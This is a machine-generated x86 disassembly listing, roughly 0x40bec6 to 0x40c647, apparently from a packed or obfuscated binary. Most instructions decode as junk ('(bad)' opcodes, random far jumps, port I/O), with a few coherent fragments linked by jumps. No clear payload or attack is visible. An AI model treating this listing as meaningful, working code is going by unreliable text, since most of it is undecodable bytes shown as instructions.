  40bec6:	xchg   ebp,ebx
  40bec8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bec9:	lahf   
  40beca:	xor    ch,BYTE PTR [eax-0x73]
  40becd:	outs   dx,BYTE PTR ds:[esi]
  40bece:	inc    ebp
  40becf:	pop    ds
  40bed0:	xor    eax,0x503f9cce
  40bed5:	inc    ebp
  40bed6:	mov    dl,0x1c
  40bed8:	push   ecx
  40bed9:	leave  
  40beda:	jmp    0xa372:0x9513bf3
  40bee1:	sbb    DWORD PTR [ebx-0x62bdb45],0x71
  40bee8:	mov    esp,0x2dc92828
  40beed:	jns    0x40bf38
  40beef:	scas   al,BYTE PTR es:[edi]
  40bef0:	or     cl,BYTE PTR [edi+ebp*2]
  40bef3:	push   esp
  40bef4:	ret    
  40bef5:	or     eax,0xd5141e8e
  40befa:	in     eax,dx
  40befb:	inc    ebp
  40befc:	mov    ecx,DWORD PTR [ebx+edi*1+0x33]
  40bf00:	mov    eax,ds:0x3b294ec9
  40bf05:	and    bl,ah
  40bf07:	xor    al,0xa0
  40bf09:	(bad)  [edx]
  40bf0b:	mov    esp,0x933d9c3b
  40bf10:	loope  0x40bf54
  40bf12:	mov    bl,0x42
  40bf14:	inc    edi
  40bf15:	add    ebp,eax
  40bf17:	or     esi,DWORD PTR [ecx+0xa4ede4e]
  40bf1d:	daa    
  40bf1e:	adc    BYTE PTR [edi],bh
  40bf20:	xchg   ebx,eax
  40bf21:	test   DWORD PTR [edi+0x1d],ebp
  40bf24:	push   esp
  40bf25:	jge    0x40bef0
  40bf27:	cmp    ch,BYTE PTR [edx+0x121061e9]
  40bf2d:	xchg   edi,eax
  40bf2e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bf2f:	mov    esp,0xd9c8b1d0
  40bf34:	ficom  DWORD PTR [edi+0x48]
  40bf37:	pop    edi
  40bf38:	mov    ebp,DWORD PTR [ebp+edx*2-0x644da5d7]
  40bf3f:	xor    eax,0xf7c849c4
  40bf44:	fwait
  40bf45:	push   ecx
  40bf46:	mov    WORD PTR [edx-0x369749ce],ss
  40bf4c:	mov    ds:0x5e2c77db,al
  40bf51:	push   edx
  40bf52:	mov    eax,ds:0x24fa512
  40bf57:	test   WORD PTR [ebx-0x23cbb59d],cx
  40bf5e:	add    ebx,DWORD PTR [edx-0x3656746b]
  40bf64:	mov    dh,0x80
  40bf66:	sbb    DWORD PTR [eax],0xd15ae784
  40bf6c:	shr    esi,1
  40bf6e:	mov    edx,0x6e696a27
  40bf73:	sti    
  40bf74:	or     edi,DWORD PTR [ebx-0x36]
  40bf77:	mov    ecx,0x170fe02d
  40bf7c:	cmp    eax,0xbf3bc75b
  40bf81:	sbb    al,0x17
  40bf83:	ror    BYTE PTR [ebx+0x3f8b087d],0xba
  40bf8a:	mov    al,BYTE PTR ss:[eax]
  40bf8d:	add    BYTE PTR [esi+0x33],ah
  40bf90:	ret    0xfcba
  40bf93:	cmp    al,BYTE PTR [eax]
  40bf95:	add    BYTE PTR [esi+0x3],ah
  40bf98:	ret    0x3b66
  40bf9b:	pop    es
  40bf9c:	je     0x40c934
  40bfa2:	mov    eax,DWORD PTR [ebp-0x14]
  40bfa5:	xor    eax,ecx
  40bfa7:	add    eax,esi
  40bfa9:	mov    DWORD PTR [ebp-0x24],eax
  40bfac:	jmp    0x40c2c5
  40bfb1:	int3   
  40bfb2:	into   
  40bfb3:	retf   
  40bfb4:	ror    cl,1
  40bfb6:	(bad)  
  40bfb8:	ficom  DWORD PTR [edi+ebx*4+0x6c]
  40bfbc:	cmc    
  40bfbd:	mov    ah,0x18
  40bfbf:	inc    edx
  40bfc0:	das    
  40bfc1:	ds xchg esi,eax
  40bfc3:	js     0x40c03d
  40bfc5:	je     0x40c045
  40bfc7:	js     0x40c041
  40bfc9:	cli    
  40bfca:	and    ah,BYTE PTR [edi]
  40bfcc:	clc    
  40bfcd:	push   ecx
  40bfce:	xchg   edx,eax
  40bfcf:	jmp    0xa2e7:0x86d8
  40bfd5:	jl     0x40bfcb
  40bfd7:	jne    0x40c017
  40bfd9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bfda:	mov    al,0xe6
  40bfdc:	add    esi,edi
  40bfde:	pop    esp
  40bfdf:	jo     0x40c02f
  40bfe1:	or     dh,dh
  40bfe3:	cmp    BYTE PTR [eax+edx*8+0x77f9a48b],ch
  40bfea:	pushf  
  40bfeb:	jae    0x40bf70
  40bfed:	or     dh,cl
  40bfef:	cmp    cl,ah
  40bff1:	test   ebx,edx
  40bff3:	aad    0xf5
  40bff5:	fadd   DWORD PTR [ecx]
  40bff7:	fld    DWORD PTR [eax+0x1f7f99bf]
  40bffd:	scas   eax,DWORD PTR es:[edi]
  40bffe:	dec    DWORD PTR [esi-0x7c]
  40c001:	inc    edi
  40c002:	pop    esp
  40c003:	jmp    0x906e:0x7fa32a53
  40c00a:	test   al,0xbc
  40c00c:	sbb    eax,0xb3366980
  40c011:	ret    
  40c012:	and    eax,DWORD PTR [ebx-0x44]
  40c015:	cmc    
  40c016:	dec    ebx
  40c017:	lods   eax,DWORD PTR ds:[esi]
  40c018:	mov    ecx,0x4a12e2f3
  40c01d:	or     esp,DWORD PTR [ebx+0x4fc54f58]
  40c023:	idiv   edx
  40c025:	cwde   
  40c026:	call   0xa55dd8b3
  40c02b:	pop    eax
  40c02c:	xchg   DWORD PTR [ebx+0x22c9d2fa],edx
  40c032:	nop
  40c033:	sub    eax,0x86647799
  40c038:	pop    ds
  40c039:	adc    edi,esp
  40c03b:	add    al,0xa8
  40c03d:	sub    eax,0xfbc6ca88
  40c042:	pop    ebx
  40c043:	dec    eax
  40c044:	pusha  
  40c045:	retf   
  40c046:	push   ss
  40c047:	push   cs
  40c048:	outs   dx,DWORD PTR ds:[esi]
  40c049:	xchg   esi,eax
  40c04a:	and    edx,edx
  40c04c:	sub    eax,0x2c606136
  40c051:	add    DWORD PTR [bp+si],edi
  40c054:	imul   BYTE PTR [esi]
  40c056:	push   ecx
  40c057:	jno    0x40c068
  40c059:	(bad)  [edi]
  40c05b:	mov    ch,BYTE PTR [esi-0x3a]
  40c05e:	push   0xffffffa3
  40c060:	xor    al,0x4c
  40c062:	fistp  DWORD PTR [edi-0x5ab272c5]
  40c068:	mov    al,ds:0x6c96148
  40c06d:	sub    al,0x68
  40c06f:	inc    esp
  40c070:	scas   eax,DWORD PTR es:[edi]
  40c071:	aad    0x0
  40c073:	push   esi
  40c074:	(bad)  
  40c075:	push   edx
  40c076:	and    esi,eax
  40c078:	jnp    0x40c05c
  40c07a:	push   es
  40c07b:	popa   
  40c07c:	inc    BYTE PTR [ebx]
  40c07e:	in     al,0xe8
  40c080:	inc    esp
  40c081:	lds    esi,FWORD PTR [ecx+edi*8+0xab10ed1]
  40c088:	rcr    BYTE PTR [edi],1
  40c08a:	xchg   esi,eax
  40c08b:	jae    0x40c0b2
  40c08d:	push   es
  40c08e:	out    dx,eax
  40c08f:	xchg   esp,eax
  40c090:	or     eax,0x981ccbbe
  40c095:	or     DWORD PTR [ebx],0x7d7587e5
  40c09b:	push   ss
  40c09c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c09d:	xchg   esi,eax
  40c09e:	outs   dx,BYTE PTR ds:[esi]
  40c09f:	mov    ch,0x74
  40c0a1:	sbb    esp,ebx
  40c0a3:	and    BYTE PTR [eax],dh
  40c0a5:	icebp  
  40c0a6:	(bad)  
  40c0a7:	out    dx,eax
  40c0a8:	cwde   
  40c0a9:	and    BYTE PTR [ebx-0x26cb56aa],ch
  40c0af:	mov    ah,ch
  40c0b1:	popa   
  40c0b2:	aas    
  40c0b3:	pop    esi
  40c0b4:	ss inc edi
  40c0b6:	jb     0x40c0a7
  40c0b8:	push   ds
  40c0b9:	shr    BYTE PTR [edi],0x6e
  40c0bc:	push   ss
  40c0bd:	popa   
  40c0be:	and    DWORD PTR [ecx-0x80],esi
  40c0c1:	pop    ebp
  40c0c2:	dec    ecx
  40c0c3:	xchg   edi,eax
  40c0c4:	out    0x59,eax
  40c0c6:	clc    
  40c0c7:	dec    DWORD PTR [ecx+ecx*2]
  40c0ca:	jmp    0xff96:0xcf803810
  40c0d1:	sbb    ebx,ebp
  40c0d3:	xrelease mov BYTE PTR [esi+eiz*2],al
  40c0d7:	mov    ebx,0xa389e135
  40c0dc:	xchg   eax,ebx
  40c0de:	sbb    al,0xbd
  40c0e0:	cmp    ecx,DWORD PTR [esi+0x3]
  40c0e3:	pop    ds
  40c0e4:	pop    ds
  40c0e5:	fldenv [ebp+0x12e29059]
  40c0eb:	inc    edx
  40c0ec:	jbe    0x40c0e5
  40c0ee:	out    dx,eax
  40c0ef:	pop    ds
  40c0f0:	fistp  WORD PTR [ecx+0x24]
  40c0f3:	stos   DWORD PTR es:[edi],eax
  40c0f4:	arpl   WORD PTR [esi],ax
  40c0f6:	add    BYTE PTR [esi-0x2ff03b5],al
  40c0fc:	xor    ah,0xb4
  40c0ff:	sub    eax,0x828c0ced
  40c104:	and    al,0x93
  40c106:	fisttp QWORD PTR [eax+0x30]
  40c109:	cmp    DWORD PTR [esi],ecx
  40c10b:	lea    ebx,gs:[edi]
  40c10e:	retf   
  40c10f:	cmp    eax,0xc1f9b98d
  40c114:	scas   al,BYTE PTR es:[edi]
  40c115:	lahf   
  40c116:	loope  0x40c0a9
  40c118:	xor    bl,BYTE PTR [eax+ebx*4+0x41ebf84a]
  40c11f:	aad    0x88
  40c121:	xlat   BYTE PTR ds:[ebx]
  40c122:	inc    esp
  40c123:	xchg   DWORD PTR [ebp+0x7484a1ed],esi
  40c129:	push   ds
  40c12a:	js     0x40c14c
  40c12c:	dec    eax
  40c12d:	jle    0x40c181
  40c12f:	jmp    0xfd70:0xb4c856dc
  40c136:	cmc    
  40c137:	aad    0x8c
  40c139:	lea    esi,[ebx+edx*2]
  40c13c:	sar    BYTE PTR [ecx+0x1c],cl
  40c13f:	sub    bl,bh
  40c141:	or     dl,BYTE PTR [ecx+0x17]
  40c144:	stc    
  40c145:	inc    ebp
  40c146:	pop    edi
  40c147:	jl     0x40c120
  40c149:	fisttp WORD PTR [ebp-0x5b]
  40c14c:	adc    ebp,DWORD PTR [edi+0x74709537]
  40c152:	and    DWORD PTR [eax],eax
  40c154:	or     BYTE PTR [ecx-0x30cf27b7],dh
  40c15a:	rcr    DWORD PTR ds:0x2de304bb,1
  40c160:	mov    bl,0x9f
  40c162:	(bad)  
  40c163:	in     al,dx
  40c164:	push   cs
  40c165:	test   BYTE PTR [ebp-0x30],al
  40c168:	fxch   st(0)
  40c16a:	rol    BYTE PTR [ecx+0x50],cl
  40c16d:	mov    ch,0xc7
  40c16f:	and    DWORD PTR [eax+0x42d47229],esi
  40c175:	ins    BYTE PTR es:[edi],dx
  40c176:	pop    esi
  40c177:	imul   ebp,DWORD PTR ds:0xe398ad97,0x6d487ab6
  40c181:	inc    dl
  40c183:	ror    DWORD PTR [eax+0x40cfbc17],0x6a
  40c18a:	xchg   esi,eax
  40c18b:	or     ecx,esi
  40c18d:	test   ah,dh
  40c18f:	and    ecx,edi
  40c191:	jbe    0x40c138
  40c193:	mov    ebx,0x45782b3a
  40c198:	dec    ebp
  40c199:	and    BYTE PTR [ebp+0x471fb4c9],ah
  40c19f:	lods   eax,DWORD PTR cs:[esi]
  40c1a1:	xlat   BYTE PTR ds:[ebx]
  40c1a2:	mov    ebx,0xd17d7f70
  40c1a7:	lods   eax,DWORD PTR ds:[esi]
  40c1a8:	and    al,0x5d
  40c1aa:	out    dx,al
  40c1ab:	jb     0x40c134
  40c1ad:	pop    edx
  40c1ae:	mov    edx,0xafebbadc
  40c1b3:	mov    eax,esi
  40c1b5:	mov    ?,WORD PTR [esi+0x36]
  40c1b8:	enter  0xb24e,0xff
  40c1bc:	in     eax,0x75
  40c1be:	dec    ebp
  40c1bf:	fst    QWORD PTR [ebp+0xe555304]
  40c1c5:	(bad)  
  40c1c6:	mov    ebp,0xfaedd432
  40c1cb:	ds mov edi,0xdfa868c5
  40c1d1:	and    DWORD PTR [esi+0x16],edx
  40c1d4:	inc    eax
  40c1d5:	popa   
  40c1d6:	mov    edi,ebp
  40c1d8:	push   eax
  40c1d9:	pop    ss
  40c1da:	mov    ah,0xe4
  40c1dc:	sub    ah,BYTE PTR [edx-0x35]
  40c1df:	inc    ebx
  40c1e0:	xor    BYTE PTR [ecx-0x3a5f7af],cl
  40c1e6:	loopne 0x40c21f
  40c1e8:	mov    edx,0xd539a7c1
  40c1ed:	jp     0x40c268
  40c1ef:	cmp    dh,0xe4
  40c1f2:	mov    bl,0x69
  40c1f4:	sbb    esp,DWORD PTR [ebp-0x2e]
  40c1f7:	test   BYTE PTR [ebx+edi*2+0x6a],0x9b
  40c1fc:	in     al,0xa6
  40c1fe:	cmp    bh,BYTE PTR [ebx-0x37]
  40c201:	pusha  
  40c202:	loop   0x40c240
  40c204:	ret    
  40c205:	sbb    ch,BYTE PTR [edx-0x74]
  40c208:	jle    0x40c230
  40c20a:	dec    esi
  40c20b:	(bad)  
  40c20c:	aad    0x2c
  40c20e:	jg     0x40c1e7
  40c210:	test   ebx,0x10879cbb
  40c216:	mov    ds:0x43c3fbb5,al
  40c21b:	lock sub al,0xe5
  40c21e:	enter  0x525,0x64
  40c222:	fild   QWORD PTR [ebx]
  40c224:	fnsave [esi-0x7187d160]
  40c22a:	cmp    BYTE PTR [ecx],ch
  40c22c:	sahf   
  40c22d:	or     esi,0xffffffd4
  40c230:	adc    al,0x68
  40c232:	cwde   
  40c233:	fidivr WORD PTR [edi-0x5a22c02d]
  40c239:	jl     0x40c204
  40c23b:	and    DWORD PTR [ebx-0x11299a5f],edi
  40c241:	jg     0x40c1f8
  40c243:	sbb    edi,DWORD PTR [edi-0x7d]
  40c246:	gs out 0x74,eax
  40c249:	shr    BYTE PTR [edi+0x2e],1
  40c24c:	cmc    
  40c24d:	mov    DWORD PTR [ecx+edx*2-0x295876cb],ebp
  40c254:	dec    edx
  40c255:	inc    ebp
  40c256:	hlt    
  40c257:	call   0x995d3f75
  40c25c:	cmp    eax,DWORD PTR [edi-0x20]
  40c25f:	mov    al,0x1f
  40c261:	add    edi,ecx
  40c263:	xchg   esp,eax
  40c264:	add    edx,ebp
  40c266:	jbe    0x40c21d
  40c268:	aam    0x23
  40c26a:	imul   ebp,DWORD PTR [edi-0x25],0xc321c648
  40c271:	push   ecx
  40c272:	ret    0x2407
  40c275:	cmp    ebp,DWORD PTR [edi+0x76]
  40c278:	jecxz  0x40c2b3
  40c27a:	cmp    dh,dh
  40c27c:	add    BYTE PTR [edx+0x255662f5],dh
  40c282:	stc    
  40c283:	mov    dh,0x6a
  40c285:	ss in  al,dx
  40c287:	mov    eax,0xc7bd33e6
  40c28c:	and    dl,BYTE PTR [eax]
  40c28e:	mov    al,0xb9
  40c290:	bound  edi,QWORD PTR [esp+ebp*2]
  40c293:	cmp    al,BYTE PTR [ecx-0x1]
  40c296:	mov    edx,0x4e0d8325
  40c29b:	mov    dh,0x24
  40c29d:	dec    ecx
  40c29e:	push   cs
  40c29f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c2a0:	push   ebx
  40c2a1:	xchg   esi,eax
  40c2a2:	jno    0x40c28d
  40c2a4:	call   0x41ca4af0
  40c2a9:	add    ah,0xe3
  40c2ac:	adc    dl,BYTE PTR [edi-0x7c21eb5b]
  40c2b2:	(bad)  
  40c2b4:	ror    ebx,cl
  40c2b6:	cld    
  40c2b7:	push   ds
  40c2b8:	imul   edx,DWORD PTR [ebp-0x15],0xae3e5a23
  40c2bf:	ins    BYTE PTR es:[edi],dx
  40c2c0:	add    BYTE PTR [edx+0x60],dh
  40c2c3:	xchg   DWORD PTR [ecx],ebp
  40c2c5:	mov    eax,DWORD PTR [ebp-0x28]
  40c2c8:	mov    di,WORD PTR [ebp-0x2c]
  40c2cc:	mov    ebx,0x8a36
  40c2d1:	jmp    0x40c5ea
  40c2d6:	xlat   BYTE PTR ds:[ebx]
  40c2d7:	cmp    al,0xc4
  40c2d9:	ds fcmovnb st,st(6)
  40c2dc:	(bad)  
  40c2de:	js     0x40c267
  40c2e0:	adc    BYTE PTR [eax+0x43],bh
  40c2e3:	or     edi,ebp
  40c2e5:	pushf  
  40c2e6:	cmp    bl,BYTE PTR [ebx+0x7e747878]
  40c2ec:	js     0x40c366
  40c2ee:	aaa    
  40c2ef:	(bad)  
  40c2f0:	jmp    0x5c9d1243
  40c2f5:	cwde   
  40c2f6:	ret    0x5276
  40c2f9:	mov    dl,0x1b
  40c2fb:	pop    ebx
  40c2fc:	retf   
  40c2fd:	mov    WORD PTR [esi+0x41],fs
  40c300:	mov    al,ds:0x9073d248
  40c305:	mov    bl,0xa5
  40c307:	enter  0x5b9f,0xbd
  40c30b:	loop   0x40c366
  40c30d:	stc    
  40c30e:	test   DWORD PTR [ebx-0x2743c13f],ebx
  40c314:	loop   0x40c366
  40c316:	adc    ebp,DWORD PTR [ebx+0x22fbc378]
  40c31c:	out    0xe1,eax
  40c31e:	js     0x40c37b
  40c320:	in     eax,dx
  40c321:	div    BYTE PTR [edi]
  40c323:	ins    DWORD PTR es:[edi],dx
  40c324:	ret    
  40c325:	add    edi,edx
  40c327:	xchg   BYTE PTR [eax+0x6855c198],cl
  40c32d:	mov    bh,dh
  40c32f:	retf   
  40c330:	(bad)  
  40c331:	idiv   bh
  40c333:	in     eax,0xd7
  40c335:	iret   
  40c336:	imul   edx,esi,0x16bef081
  40c33c:	and    al,0x4a
  40c33e:	div    DWORD PTR [eax]
  40c340:	sar    DWORD PTR [eax+edx*2-0x6f],1
  40c344:	pop    ss
  40c345:	test   DWORD PTR [edi+0x2074958c],eax
  40c34b:	or     eax,0xfb087eec
  40c350:	scas   al,BYTE PTR es:[edi]
  40c351:	pop    edi
  40c352:	es mov edx,0xb4f63fd7
  40c358:	xor    ebx,DWORD PTR [esi+0x764a02aa]
  40c35e:	jg     0x40c3b5
  40c360:	cmp    DWORD PTR [ecx-0x45f4c6fd],ecx
  40c366:	rcl    DWORD PTR [ebx],0x25
  40c369:	call   0xc4c3:0xce44cb76
  40c370:	add    DWORD PTR [esi-0x3e],edx
  40c373:	sahf   
  40c374:	sti    
  40c375:	(bad)  
  40c376:	not    bh
  40c378:	inc    ecx
  40c379:	rol    BYTE PTR [ebp+0x26],1
  40c37c:	add    DWORD PTR [eax],ebx
  40c37e:	mov    ?,WORD PTR [edx+0x48ec5d17]
  40c384:	cld    
  40c385:	adc    eax,0x86fc0457
  40c38a:	test   al,0xf0
  40c38c:	sub    al,0x14
  40c38e:	xor    edx,DWORD PTR cs:[ebx-0x52683a35]
  40c395:	ror    DWORD PTR [esi],1
  40c397:	push   edx
  40c398:	in     al,dx
  40c399:	pop    edx
  40c39a:	sub    BYTE PTR [edi],al
  40c39c:	cmc    
  40c39d:	sub    ah,ah
  40c39f:	xchg   ecx,eax
  40c3a0:	jge    0x40c3a3
  40c3a2:	das    
  40c3a3:	imul   edx,esi,0xc23d8cdd
  40c3a9:	jmp    0x40c344
  40c3ab:	into   
  40c3ac:	cmp    BYTE PTR [ebp+0x2e],ah
  40c3af:	inc    ebx
  40c3b0:	dec    ebx
  40c3b1:	stos   DWORD PTR es:[edi],eax
  40c3b2:	out    dx,al
  40c3b3:	les    esi,FWORD PTR [eax-0x52]
  40c3b6:	xor    BYTE PTR [edx-0x11ad8b34],ch
  40c3bc:	jns    0x40c3db
  40c3be:	stc    
  40c3bf:	push   ss
  40c3c0:	jne    0x40c427
  40c3c2:	xor    edi,ebx
  40c3c4:	cmp    bl,BYTE PTR [edi+0x3d]
  40c3c7:	rcr    esi,1
  40c3c9:	ret    
  40c3ca:	scas   eax,DWORD PTR es:[edi]
  40c3cb:	stc    
  40c3cc:	daa    
  40c3cd:	or     al,0xc2
  40c3cf:	jnp    0x40c428
  40c3d1:	sub    DWORD PTR [ecx+eax*4+0x7e],edx
  40c3d5:	push   edi
  40c3d6:	fmul   QWORD PTR [esi]
  40c3d8:	in     al,0x9e
  40c3da:	popf   
  40c3db:	pop    esi
  40c3dc:	pop    es
  40c3dd:	sub    eax,0x5f3926b6
  40c3e2:	outs   dx,BYTE PTR ds:[esi]
  40c3e3:	(bad)  
  40c3e5:	shl    BYTE PTR [ebx-0x3f69ba5f],1
  40c3eb:	adc    ch,cl
  40c3ed:	adc    edx,DWORD PTR [esi+0x4b]
  40c3f0:	pop    ds
  40c3f1:	loopne 0x40c383
  40c3f3:	pusha  
  40c3f4:	xchg   esp,eax
  40c3f5:	lea    ebx,[edi+ebx*2-0x18252eed]
  40c3fc:	xchg   ebp,eax
  40c3fd:	ss (bad) 
  40c3ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c400:	sbb    bh,BYTE PTR [edi+0x7a]
  40c403:	push   esp
  40c404:	push   edi
  40c405:	inc    ebx
  40c406:	inc    eax
  40c407:	ret    
  40c408:	neg    DWORD PTR [ecx-0x5a51d134]
  40c40e:	test   BYTE PTR [edi+0x44eaa9eb],bh
  40c414:	vmwrite esi,DWORD PTR gs:[ebp-0x7d]
  40c419:	dec    eax
  40c41a:	sub    dh,BYTE PTR [edx-0x31e53470]
  40c420:	shl    DWORD PTR [ebp-0x63b2d3ef],0xf6
  40c427:	xchg   edx,eax
  40c428:	leave  
  40c429:	and    BYTE PTR [edx-0x71],bl
  40c42c:	push   0x86562b2b
  40c431:	and    dl,0xb6
  40c434:	dec    ecx
  40c435:	inc    esi
  40c436:	clc    
  40c437:	xchg   edx,eax
  40c438:	push   0xffffffef
  40c43a:	jmp    0x40c45a
  40c43c:	dec    edx
  40c43d:	dec    esi
  40c43e:	jg     0x40c3e5
  40c440:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c441:	sbb    BYTE PTR ds:0xcfaacedf,dh
  40c447:	sbb    eax,0x1a0841ac
  40c44c:	dec    esp
  40c44d:	pusha  
  40c44e:	lods   al,BYTE PTR ds:[esi]
  40c44f:	lods   al,BYTE PTR ds:[esi]
  40c450:	or     ch,al
  40c452:	cld    
  40c453:	push   ecx
  40c454:	leave  
  40c455:	outs   dx,BYTE PTR ds:[esi]
  40c456:	out    dx,al
  40c457:	in     al,dx
  40c458:	outs   dx,DWORD PTR ds:[esi]
  40c459:	jnp    0x40c44a
  40c45b:	cmp    ebp,DWORD PTR ds:0x950b5e88
  40c461:	into   
  40c462:	out    0x3a,al
  40c464:	(bad)  
  40c465:	xor    DWORD PTR ds:[esi+0x3841fe73],edx
  40c46c:	dec    edi
  40c46d:	stc    
  40c46e:	in     eax,0x5a
  40c470:	or     esp,esp
  40c472:	(bad)  
  40c473:	or     al,0xc5
  40c475:	add    DWORD PTR fs:[esi+0xacc51f0],0x58
  40c47d:	dec    ebx
  40c47e:	sahf   
  40c47f:	fs xchg ebx,eax
  40c481:	out    dx,al
  40c482:	inc    ebx
  40c483:	adc    bl,BYTE PTR [ebx]
  40c485:	pop    es
  40c486:	jmp    0x40c43a
  40c488:	or     DWORD PTR [ebx-0x3107cca2],ebp
  40c48e:	fsubp  st(7),st
  40c490:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c491:	xor    BYTE PTR [edi],al
  40c493:	shr    BYTE PTR [edi],0x24
  40c496:	mov    edi,0xd614ef8e
  40c49b:	add    BYTE PTR [ebp-0x7e],dl
  40c49e:	add    eax,0x211d9bf8
  40c4a3:	icebp  
  40c4a4:	test   DWORD PTR [esp+edx*4],ecx
  40c4a7:	stos   DWORD PTR es:[edi],eax
  40c4a8:	aam    0x34
  40c4aa:	jo     0x40c50a
  40c4ac:	pushf  
  40c4ad:	in     eax,dx
  40c4ae:	fisttp DWORD PTR [edx-0x3]
  40c4b1:	push   0xffffff89
  40c4b3:	jge    0x40c456
  40c4b5:	arpl   WORD PTR [ecx+ecx*2+0x47f3da94],dx
  40c4bc:	inc    ebp
  40c4bd:	mov    edx,0x556194e9
  40c4c2:	and    BYTE PTR [eax],ah
  40c4c4:	dec    ebx
  40c4c5:	inc    edi
  40c4c6:	xor    al,0xca
  40c4c8:	and    cl,BYTE PTR [edx]
  40c4ca:	gs ins DWORD PTR es:[edi],dx
  40c4cc:	fistp  QWORD PTR gs:[esi+0x1a64f5e3]
  40c4d3:	push   edx
  40c4d4:	cwde   
  40c4d5:	loop   0x40c491
  40c4d7:	aad    0x69
  40c4d9:	sub    eax,0xdfc979a0
  40c4de:	test   BYTE PTR [eax+ebx*2+0x17],0x3a
  40c4e3:	in     eax,dx
  40c4e4:	adc    bl,BYTE PTR [ecx+0x46]
  40c4e7:	push   esp
  40c4e8:	pop    ebp
  40c4e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c4ea:	and    al,0xc0
  40c4ec:	mov    ebx,0x47d75553
  40c4f1:	add    cl,BYTE PTR ds:0x275ed29
  40c4f7:	mov    ebx,0x2c025692
  40c4fc:	mov    ch,0xf6
  40c4fe:	inc    eax
  40c4ff:	(bad)  
  40c500:	sar    ecx,1
  40c502:	adc    dh,0x96
  40c505:	cmp    BYTE PTR [edi],0x3a
  40c508:	dec    ebp
  40c509:	imul   eax,DWORD PTR [eax-0x6c6873b2],0x2fb32b9
  40c513:	out    0xb2,eax
  40c515:	push   ecx
  40c516:	ret    0xfb3e
  40c519:	mov    fs,WORD PTR [ebp-0x7]
  40c51c:	loope  0x40c4b3
  40c51e:	add    bl,al
  40c520:	jmp    DWORD PTR [ecx-0x183e5a76]
  40c526:	mov    esi,0xbc5f6883
  40c52b:	adc    eax,0x51afe3a3
  40c530:	add    al,BYTE PTR [edx+0x53]
  40c533:	(bad)
  40c536:	sub    ah,BYTE PTR [eax+0x49590181]
  40c53c:	sti    
  40c53d:	add    eax,0x8a045077
  40c542:	xchg   esi,eax
  40c543:	pop    esp
  40c544:	xor    eax,DWORD PTR [edx+0x231e7276]
  40c54a:	jne    0x40c557
  40c54c:	add    BYTE PTR [ebx+0x27],al
  40c54f:	iret   
  40c550:	rcl    DWORD PTR [edi],0xf5
  40c553:	clc    
  40c554:	jg     0x40c5a6
  40c556:	repz (bad) [ecx-0x2e462c37]
  40c55d:	fcom   QWORD PTR [esi+0x473d18b2]
  40c563:	xor    eax,0x2785d82a
  40c568:	push   esi
  40c569:	xchg   ebp,eax
  40c56a:	daa    
  40c56b:	retf   0x5967
  40c56e:	es jecxz 0x40c507
  40c571:	aad    0x1b
  40c573:	outs   dx,BYTE PTR ds:[esi]
  40c574:	inc    al
  40c576:	dec    esi
  40c577:	outs   dx,DWORD PTR ds:[esi]
  40c578:	sbb    esp,ecx
  40c57a:	ffree  st(4)
  40c57c:	and    eax,0x88f4b5f
  40c581:	cmc    
  40c582:	jecxz  0x40c546
  40c584:	jo     0x40c586
  40c586:	pusha  
  40c587:	daa    
  40c588:	sub    al,0x47
  40c58a:	stos   DWORD PTR es:[edi],eax
  40c58b:	test   DWORD PTR [edx-0x135ff13c],edx
  40c591:	dec    esp
  40c592:	loope  0x40c55d
  40c594:	daa    
  40c595:	add    cl,BYTE PTR [ebx-0x10188263]
  40c59b:	push   es
  40c59c:	pop    esi
  40c59d:	cwde   
  40c59e:	mov    ds:0xffb9d2ae,eax
  40c5a3:	push   eax
  40c5a4:	ins    DWORD PTR es:[edi],dx
  40c5a5:	test   ebp,ebp
  40c5a7:	fidivr DWORD PTR [si-0x21]
  40c5ab:	rcl    BYTE PTR [esi+0x7f07ffc3],cl
  40c5b1:	adc    al,0x22
  40c5b3:	fild   WORD PTR ds:0x6ab0f229
  40c5b9:	mov    bl,0x39
  40c5bb:	jge    0x40c57f
  40c5bd:	pop    ebp
  40c5be:	cwde   
  40c5bf:	icebp  
  40c5c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c5c1:	xor    al,0x88
  40c5c3:	jge    0x40c591
  40c5c5:	or     al,0xb2
  40c5c7:	jge    0x40c57c
  40c5c9:	inc    edx
  40c5ca:	scas   al,BYTE PTR es:[edi]
  40c5cb:	jp     0x40c571
  40c5cd:	or     al,0x32
  40c5cf:	xchg   edx,eax
  40c5d0:	pop    ds
  40c5d1:	add    bh,BYTE PTR [edi-0x6fc88600]
  40c5d7:	jns    0x40c559
  40c5d9:	sub    esp,DWORD PTR [edx-0x81e5fb4]
  40c5df:	push   ss
  40c5e0:	scas   al,BYTE PTR es:[edi]
  40c5e1:	xchg   esi,eax
  40c5e2:	xchg   ebx,eax
  40c5e3:	ja     0x40c637
  40c5e5:	out    0x4d,al
  40c5e7:	test   DWORD PTR [ebp+0x2e],ebp
  40c5ea:	xor    di,bx
  40c5ed:	add    di,dx
  40c5f0:	movzx  edx,di
  40c5f3:	mov    edi,DWORD PTR [ebp-0x8]
  40c5f6:	xor    edi,ecx
  40c5f8:	lea    edx,[edx+edi*1+0x327298]
  40c5ff:	add    DWORD PTR [eax],edx
  40c601:	jmp    0x40c91a
  40c606:	cmp    eax,0xd9d2c1d7
  40c60b:	fcmove st,st(5)
  40c60d:	(bad)  ds:0x98d2d2f7
  40c613:	and    al,0xc7
  40c615:	inc    edx
  40c616:	ss cwde 
  40c618:	js     0x40c692
  40c61a:	je     0x40c69a
  40c61c:	js     0x40c696
  40c61e:	sbb    al,0x1e
  40c620:	fwait
  40c621:	sbb    eax,0x15d74b04
  40c626:	rol    DWORD PTR [edx+0x2],0x85
  40c62a:	mov    ecx,0xe418a7ae
  40c62f:	push   0x65ba0a7
  40c634:	xlat   BYTE PTR ds:[ebx]
  40c635:	bound  edi,QWORD PTR [ecx+0x45]
  40c638:	and    bl,bh
  40c63a:	or     BYTE PTR ds:0xbc0c90fb,al
  40c640:	jmp    DWORD PTR [edx-0x2630997b]
  40c646:	xchg   esi,eax
  40c647:	cmp    eax,ebx
